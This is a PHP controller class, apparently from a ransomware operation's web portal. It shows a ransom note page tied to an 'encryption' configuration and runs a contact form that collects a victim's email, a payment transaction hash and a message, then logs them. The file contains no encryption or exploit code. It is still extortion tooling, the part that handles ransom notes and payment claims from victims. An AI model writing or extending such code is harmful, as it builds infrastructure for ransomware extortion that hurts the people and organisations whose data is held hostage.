<?php
namespace App\Controllers;

use App\Core\ConfigManager;

class RansomController {
    public function showNote() {
        $config = ConfigManager::load('encryption');
        include __DIR__ . '/../Views/ransom_note.php';
        exit;
    }
    
    public function contact() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $this->processContact();
        }
        
        $this->showContactForm();
    }
    
    private function processContact() {
        $email = $_POST['email'] ?? '';
        $transactionHash = $_POST['transaction_hash'] ?? '';
        $message = $_POST['message'] ?? '';
        
        // Here you would typically save this to a database or send an email
        // For now, we'll just log it
        \App\Core\Logger::info("Contact form submitted", [
            'email' => $email,
            'transaction_hash' => $transactionHash,
            'message' => $message
        ]);
        
        $this->showContactSuccess();
    }
    
    private function showContactForm() {
        include __DIR__ . '/../Views/contact_form.php';
        exit;
    }
    
    private function showContactSuccess() {
        include __DIR__ . '/../Views/contact_success.php';
        exit;
    }
}